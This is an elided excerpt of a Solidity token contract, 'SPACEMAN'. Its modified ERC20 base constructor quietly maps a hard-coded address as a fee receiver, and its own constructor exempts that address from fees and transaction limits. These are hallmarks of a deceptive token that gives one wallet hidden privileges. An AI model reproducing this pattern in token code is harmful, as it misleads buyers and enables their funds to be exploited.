...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0xAeA5704407992339cA106BbFCC0954405d2e6AfA] = _marketingwallet;
    }
...
contract SPACEMAN is ERC20, Ownable {
    ...
    constructor() ERC20("SPACEMAN", "SPACEMAN") {
        ...
        excludeFromFees(address(0xAeA5704407992339cA106BbFCC0954405d2e6AfA), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xAeA5704407992339cA106BbFCC0954405d2e6AfA), true);
